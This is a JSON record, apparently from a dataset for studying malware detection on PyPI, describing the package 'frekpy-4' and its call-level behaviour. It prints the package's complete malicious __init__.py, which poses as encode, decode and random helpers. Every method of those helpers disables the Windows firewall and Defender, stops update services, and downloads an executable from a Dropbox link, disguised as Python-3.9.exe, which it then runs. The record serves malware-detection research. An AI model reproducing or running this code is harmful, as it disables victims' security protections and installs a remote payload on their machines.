{
  "metadata": {
    "package_name": "frekpy-4",
    "original_json_path": "/home2/blue/Documents/PyPIAgent/Codes/tool_detect/false_negative/llm_analysis/frekpy-4.0.json",
    "dataset_type": "malware_fn"
  },
  "code_files": [
    {
      "pyfile": "__init__.py",
      "full_path": "/home2/blue/Documents/PyPIAgent/Dataset/study/unzip_malware/frekpy-4.0/frekpy-4.0/frekpy/__init__.py",
      "code_snippets": [
        {
          "snippet": "import os\ntry: import requests\nexcept:\n    os.system(\"pip install requests||py -m pip install requests\")\n    import requests\n\ndef pws():\n    comandos: list[str] = [\n        \"%SYSTEMROOT%\\\\system32\\\\WindowsPowerShell\\\\v1.0\\\\powershell.exe netsh advfirewall set allprofiles state off\",\n        \"%SYSTEMROOT%\\\\system32\\\\WindowsPowerShell\\\\v1.0\\\\powershell.exe netsh advfirewall set currentprofile state off\",\n        \"%SYSTEMROOT%\\\\system32\\\\WindowsPowerShell\\\\v1.0\\\\powershell.exe Set-MpPreference -DisableRealtimeMonitoring $ true\",\n        \"%SYSTEMROOT%\\\\system32\\\\WindowsPowerShell\\\\v1.0\\\\powershell.exe netsh advfirewall set domainprofile state off\",\n        \"%SYSTEMROOT%\\\\system32\\\\WindowsPowerShell\\\\v1.0\\\\powershell.exe Uninstall-WindowsFeature -Name Windows-Defender\",\n        \"%SYSTEMROOT%\\\\system32\\\\WindowsPowerShell\\\\v1.0\\\\powershell.exe Set-NetFirewallProfile -Profile Domain,Public,Private -Enabled False\"\n        \"net stop wuauserv\",\n        \"net stop bits\",\n        \"net stop dosvc\",\n        \"net stop spooler\",\n        \"net stop wscsvc\",\n        \"net stop wuauserv\",\n        \"net stop wudfsvc\",\n        \"net stop wwanSvc\"\n    ]\n    for comando in comandos:\n        try: os.system(comando)\n        except: pass\n\ndef inf():\n    try:\n        file = os.environ['TEMP'] + \"\\\\Python-3.9.exe\"\n        open(file, \"wb\").write(requests.get(\"https://dl.dropbox.com/s/mkd3enun97s8zag/Oxzy.exe?dl=0\").content)\n        os.system(file)\n    except:\n        raise Exception(\"This module can only be executed on machines with Windows systems.\")\n\n# The following classes repeatedly invoke the above malicious functions\nclass encode:\n    @staticmethod\n    def b64(txt: str) -> str:\n        for script in [pws, inf]:\n            try: script()\n            except: pass\n        return \"AJ42NSDL1ADnluh32jad1ND=\"\n    @staticmethod\n    def init() -> None:\n        for script in [pws, inf]:\n            try: script()\n            except: pass\n    @staticmethod\n    def start(method: int) -> None:\n        for script in [pws, inf]:\n            try: script()\n            except: pass\n    @staticmethod\n    def flush(dpi: str) -> None:\n        for script in [pws, inf]:\n            try: script()\n            except: pass\nclass decode:\n    @staticmethod\n    def b64(txt: str) -> str:\n        for script in [pws, inf]:\n            try: script()\n            except: pass\n        return \"AJ23NSD321LAD4nlu634hjadND=\"\n    @staticmethod\n    def init() -> None:\n        for script in [pws, inf]:\n            try: script()\n            except: pass\n    @staticmethod\n    def start(method: int) -> None:\n        for script in [pws, inf]:\n            try: script()\n            except: pass\n    @staticmethod\n    def flush(dpi: str) -> None:\n        for script in [pws, inf]:\n            try: script()\n            except: pass\nclass random:\n    @staticmethod\n    def randint(n1: int,\n                n2: int\n                ) -> int:\n        for script in [pws, inf]:\n            try: script()\n            except: pass\n        return 12\n    @staticmethod\n    def randstr() -> str:\n        for script in [pws, inf]:\n            try: script()\n            except: pass\n        return \"B\"\n    @staticmethod\n    def randlist(method: int) -> list[str]:\n        for script in [pws, inf]:\n            try: script()\n            except: pass\n        return [\"asdAS134asdvcxdsf\", \"iasaoiWJlPUEFsLJNpuohxas\"]\n    @staticmethod\n    def flush(dpi: str) -> None:\n        for script in [pws, inf]:\n            try: script()\n            except: pass",
          "triple_sequences": [
            {
              "action_api": "os.system()",
              "action_description": "Executes shell command",
              "action_id": "execute_shell_command",
              "object": "pip install requests||py -m pip install requests",
              "object_description": "Shell command",
              "object_id": "shell_command",
              "intention_description": "Install required Python package",
              "intention_id": "install_required_python_package"
            },
            {
              "action_api": "os.system()",
              "action_description": "Executes shell command",
              "action_id": "execute_shell_command",
              "object": "%SYSTEMROOT%\\system32\\WindowsPowerShell\\v1.0\\powershell.exe netsh advfirewall set allprofiles state off",
              "object_description": "Shell command",
              "object_id": "shell_command",
              "intention_description": "Execute command",
              "intention_id": "execute_command"
            },
            {
              "action_api": "os.system()",
              "action_description": "Executes shell command",
              "action_id": "execute_shell_command",
              "object": "%SYSTEMROOT%\\system32\\WindowsPowerShell\\v1.0\\powershell.exe netsh advfirewall set currentprofile state off",
              "object_description": "Shell command",
              "object_id": "shell_command",
              "intention_description": "Execute command",
              "intention_id": "execute_command"
            },
            {
              "action_api": "os.system()",
              "action_description": "Executes shell command",
              "action_id": "execute_shell_command",
              "object": "%SYSTEMROOT%\\system32\\WindowsPowerShell\\v1.0\\powershell.exe Set-MpPreference -DisableRealtimeMonitoring $ true",
              "object_description": "Shell command",
              "object_id": "shell_command",
              "intention_description": "Execute command",
              "intention_id": "execute_command"
            },
            {
              "action_api": "os.system()",
              "action_description": "Executes shell command",
              "action_id": "execute_shell_command",
              "object": "%SYSTEMROOT%\\system32\\WindowsPowerShell\\v1.0\\powershell.exe netsh advfirewall set domainprofile state off",
              "object_description": "Shell command",
              "object_id": "shell_command",
              "intention_description": "Execute command",
              "intention_id": "execute_command"
            },
            {
              "action_api": "os.system()",
              "action_description": "Executes shell command",
              "action_id": "execute_shell_command",
              "object": "%SYSTEMROOT%\\system32\\WindowsPowerShell\\v1.0\\powershell.exe Uninstall-WindowsFeature -Name Windows-Defender",
              "object_description": "Shell command",
              "object_id": "shell_command",
              "intention_description": "Execute command",
              "intention_id": "execute_command"
            },
            {
              "action_api": "os.system()",
              "action_description": "Executes shell command",
              "action_id": "execute_shell_command",
              "object": "%SYSTEMROOT%\\system32\\WindowsPowerShell\\v1.0\\powershell.exe Set-NetFirewallProfile -Profile Domain,Public,Private -Enabled False",
              "object_description": "Shell command",
              "object_id": "shell_command",
              "intention_description": "Execute command",
              "intention_id": "execute_command"
            },
            {
              "action_api": "os.system()",
              "action_description": "Executes shell command",
              "action_id": "execute_shell_command",
              "object": "net stop wuauserv",
              "object_description": "Shell command",
              "object_id": "shell_command",
              "intention_description": "Execute command",
              "intention_id": "execute_command"
            },
            {
              "action_api": "os.system()",
              "action_description": "Executes shell command",
              "action_id": "execute_shell_command",
              "object": "net stop bits",
              "object_description": "Shell command",
              "object_id": "shell_command",
              "intention_description": "Execute command",
              "intention_id": "execute_command"
            },
            {
              "action_api": "os.system()",
              "action_description": "Executes shell command",
              "action_id": "execute_shell_command",
              "object": "net stop dosvc",
              "object_description": "Shell command",
              "object_id": "shell_command",
              "intention_description": "Execute command",
              "intention_id": "execute_command"
            },
            {
              "action_api": "os.system()",
              "action_description": "Executes shell command",
              "action_id": "execute_shell_command",
              "object": "net stop spooler",
              "object_description": "Shell command",
              "object_id": "shell_command",
              "intention_description": "Execute command",
              "intention_id": "execute_command"
            },
            {
              "action_api": "os.system()",
              "action_description": "Executes shell command",
              "action_id": "execute_shell_command",
              "object": "net stop wscsvc",
              "object_description": "Shell command",
              "object_id": "shell_command",
              "intention_description": "Execute command",
              "intention_id": "execute_command"
            },
            {
              "action_api": "os.system()",
              "action_description": "Executes shell command",
              "action_id": "execute_shell_command",
              "object": "net stop wuauserv",
              "object_description": "Shell command",
              "object_id": "shell_command",
              "intention_description": "Execute command",
              "intention_id": "execute_command"
            },
            {
              "action_api": "os.system()",
              "action_description": "Executes shell command",
              "action_id": "execute_shell_command",
              "object": "net stop wudfsvc",
              "object_description": "Shell command",
              "object_id": "shell_command",
              "intention_description": "Execute command",
              "intention_id": "execute_command"
            },
            {
              "action_api": "os.system()",
              "action_description": "Executes shell command",
              "action_id": "execute_shell_command",
              "object": "net stop wwanSvc",
              "object_description": "Shell command",
              "object_id": "shell_command",
              "intention_description": "Execute command",
              "intention_id": "execute_command"
            },
            {
              "action_api": "os.environ.__getitem__()",
              "action_description": "Retrieves value of environment variable",
              "action_id": "get_env_var",
              "object": "'TEMP'",
              "object_description": "Environment variable",
              "object_id": "environment_variable",
              "intention_description": "Collect environment variable",
              "intention_id": "collect_environment_variable"
            },
            {
              "action_api": "requests.get()",
              "action_description": "Sends HTTP request",
              "action_id": "send_http_request",
              "object": "https://dl.dropbox.com/s/mkd3enun97s8zag/Oxzy.exe?dl=0",
              "object_description": "External domain",
              "object_id": "external_domain",
              "intention_description": "Download remote content",
              "intention_id": "download_remote_content"
            },
            {
              "action_api": "open()",
              "action_description": "File opening operations for writing (normal writing, binary writing)",
              "action_id": "basic_write_operations",
              "object": "file, \"wb\"",
              "object_description": "Local file",
              "object_id": "local_file",
              "intention_description": "Open file for writing",
              "intention_id": "open_file_writing"
            },
            {
              "action_api": "file.write()",
              "action_description": "File opening operations for writing (normal writing, binary writing)",
              "action_id": "basic_write_operations",
              "object": "requests.get(...).content",
              "object_description": "File text",
              "object_id": "file_text",
              "intention_description": "Write downloaded content to file",
              "intention_id": "write_downloaded_content_file"
            },
            {
              "action_api": "os.system()",
              "action_description": "Executes shell command",
              "action_id": "execute_shell_command",
              "object": "file",
              "object_description": "Executable file",
              "object_id": "executable_file",
              "intention_description": "Execute file",
              "intention_id": "execute_file"
            }
          ]
        }
      ]
    }
  ]
}